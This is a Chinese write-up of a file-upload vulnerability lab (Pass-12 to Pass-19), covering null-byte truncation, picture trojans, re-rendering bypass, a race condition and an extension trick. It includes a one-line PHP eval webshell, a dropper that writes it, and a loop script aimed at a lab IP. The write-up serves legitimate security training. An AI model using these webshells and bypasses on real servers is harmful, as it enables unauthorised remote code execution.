也就是在文件名后面添加截断符号<code>%00</code> ,这样做的作用是将截断数据, Windows创建文件时会忽略后面 <code>rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext</code>这行代码, 这样$img_path变量值就变成了<code>../upload/webshell.php</code></p><p><code>%00</code> 是 URL 编码中的一个字符，它表示一个空字符（NULL 字符）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)</span><br></pre></td></tr></table></figure><p>将文件的名称修改成<code>webshell.jpg</code>, 通过这行代码可以将webshell.jpg移动至upload目录, 并将文件名修改成<code>webshell.php</code></p><p><code>%00</code>截断法只适用于php版本低于5.3的, 且需要在phpstudy把魔术引号函数magic_quotes_gpc关闭掉,这里环境有点问题，我就拿CTFhub的题目来练习</p><p><img src="/../image/image-20240815163449782.png" alt="image-20240815163449782"></p><p>代码是差不多的，路径都可以不用改,让他生成一个test.php，然后把1.jpg的内容写进去</p><p><img src="/../image/image-20240815163939149.png" alt="image-20240815163939149"></p><p>没报异常，访问也没问题，蚁剑连接也成功了</p><p><img src="/../image/image-20240815164045509.png" alt="image-20240815164045509"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>此关卡与pass-12相似， 但不同的是pass-12的save_path参数是通过get请求获取的, 而这关是通过post请求获取的, get请求传递的参数后端会自动进行解码, 但是post请求传递的参数后端不会自动解码, 因此我们要对截断符<code>%00</code>进行url解码,解码完看不到东西是因为解码完事NULL，这里环境复现有点问题，就只能看看攻略了</p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p><img src="/../image/image-20240815165001374.png" alt="image-20240815165001374"></p><p>这关任务要求变了，我们先看看源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会读文件开头的两个字节来验证，所以我们需要在图片马前面加上GIF89a，255216等相应的字节码，这里就测试两种方法</p><p>一：制作图片马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy btest.jpg/b + 14.php/ webshell.jpg</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240815192844569.png" alt="image-20240815192844569"></p><p>二：添加文件头</p><p><img src="/../image/image-20240815193048120.png" alt="image-20240815193048120"></p><p><strong>注意空行</strong>，访问解析，解析不了，得配合文件上传测试</p><p><img src="/../image/image-20240815193303588.png" alt="image-20240815193303588"></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><p>返回结果说明</p><ul><li>索引 0 给出的是图像宽度的像素值</li><li>索引 1 给出的是图像高度的像素值</li><li>索引 2 给出的是图像的类型，返回的是数字，其中1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM</li><li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</li><li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li><li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li><li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image&#x2F;jpeg”);</li></ul><p>image_type_to_extension这个函数的作用是将返回的类型作为拓展名，所以哦我们只要让getimagesize返回的扩展名是争取的即可</p><p>所以和Pass-14一样，这里就不作演示了</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>此关卡使用<code>exif_imagetype()</code>函数来识别文件类型, 此函数和<code>getimagesize()</code>的原理差不多, 都是通过读取文件头来判断文件类型和前两个一样，也不作演示了</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>imagecreatefromjpeg — 由文件或 URL 创建一个新图象,由于新的图像文件是经过二次渲染后的, 所以我们在图像中布置的恶意代码也会被刷新, 从而导致不能配合文件包含漏洞来解析脚本文件</p><p>但是, 二次渲染后的文件并不是所有文件内容都会被刷新, 有一小部分是没有修改的, 我们只需找到这一小部分内容的位置, 然后将代码插入进去, 就能实现绕过，所以我们先上传一个gif文件，然后把访问到的gif文件和原来的文件对比，看看哪些部分没有被修改</p><p><img src="/../image/image-20240815231040077.png" alt="image-20240815231040077"></p><p>开头几乎一样，不同的主要是后面，我们只要在不要破坏文件结构的情况下插入代码即可</p><p><img src="/../image/image-20240815231227996.png" alt="image-20240815231227996"></p><p>重新上传</p><p><img src="/../image/image-20240815231349188.png" alt="image-20240815231349188"></p><p>成功解析</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>此关卡主要考察条件竞争, 如下代码所示, 后端先将文件上传至网站目录, 然后才对文件进行检验来决定是否删除这个文件, 如果我们在上传文件的瞬间, 也就是文件没被删除的时候, 访问这个文件, 就能实现绕过，就是后台开个爆破，我们去访问这个文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以先上传一个shell.php，然后用bp抓包，因为只要一直请求，所以不用设置什么爆破参数，直接清楚即可</p><p><img src="/../image/image-20240816094035964.png" alt="image-20240816094035964"></p><p>不用payload，一直发包即可</p><p><img src="/../image/image-20240816095640674.png" alt="image-20240816095640674"></p><p>然后用默认的线程数即可</p><p><img src="/../image/image-20240816095743054.png" alt="image-20240816095743054"></p><p>然后发包，用另一个浏览器一直访问18.php地址，只要在上传的一瞬间，他还没来的及删除、修改就可以了。但这里我没有试成功，可能是线程数不够大（后面调成900就行了），这里有看了另一篇文章，试下他的方法<a href="https://blog.csdn.net/qq_43665434/article/details/115131927%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%86%99shell%E6%96%B9%E6%B3%95%E8%BF%98%E6%AF%94%E8%BE%83%E5%A5%BD%E6%B5%8B%EF%BC%8C%E7%9C%8Bphpinfo()%E6%9C%89%E6%97%B6%E5%80%99%E7%82%B9%E5%BF%AB%E4%BA%86%E5%88%B7%E6%96%B0%E6%8E%89%E4%BA%86%EF%BC%8C%E6%94%B9%E4%B8%80%E4%B8%8B18.php%E6%96%87%E4%BB%B6">https://blog.csdn.net/qq_43665434/article/details/115131927，这个写shell方法还比较好测，看phpinfo()有时候点快了刷新掉了，改一下18.php文件</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#18.php</span></span><br><span class="line"><span class="comment">#用来写入木马文件shell.phpPOST</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240816103212141.png" alt="image-20240816103212141"></p><p>图片有错，一句话得马格式错了，用python写一个请求18.php的脚本，也可以手动刷，这个多刷几次，去连一下试试，这里用下作者的脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="comment">#用来请求18.php</span></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.174.160/upload/upload/18.php&quot;</span></span><br><span class="line">url_2 = <span class="string">&quot;http://192.168.174.160/upload/upload/shell.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    html = requests.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line">    html_2 = requests.<span class="title function_ invoke__">get</span>(url_2)</span><br><span class="line">    <span class="keyword">if</span> html_2.status_code == <span class="number">200</span>:  <span class="comment">#判断shell.php是否写入成功</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240816103913980.png" alt="image-20240816103913980"></p><p>成了，shell也创建了，我们用蚁剑连连试试</p><p><img src="/../image/image-20240816105814052.png" alt="image-20240816105814052"></p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>首先创建了一个Myupload类, 并调用了此类的upload函数, 传递<code>UPLOAD_PATH</code>作为upload函数的参数, <code>UPLOAD_PATH</code>的值是上传文件的所在目录, 也就是<code>/upload</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">   <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br></pre></td></tr></table></figure><p>转到<code>upload</code>函数的定义处, 这里要重点注意<code>setDir</code>这个函数, 此函数用于设置文件上传的目录,此处有一行代码写错了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setDir</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>( !<span class="title function_ invoke__">is_writable</span>( <span class="variable">$dir</span> ) )&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;DIRECTORY_FAILURE&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">#$this-&gt;cls_upload_dir = $dir;</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cls_upload_dir = <span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是少了个&#x2F;，到时候图片和upload目录就连在一起了</p><p>如下代码规定了白名单后缀, 这里要特别注意7z这个后缀, 这后缀浏览器是无法解析的, 当浏览器遇到无法解析的后缀时, 就会往前解析, 要是我们上传文件名为<code>webshell.php.7z</code>, 那么浏览器就会解析<code>.php</code>后缀而不会解析<code>.7z</code>后缀</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">     <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">     <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br></pre></td></tr></table></figure><p>剩下的就是对问文件的属性进行判断了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123; </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();<span class="comment">//判断文件是否上传成功</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );<span class="comment">//设置上传目录</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span 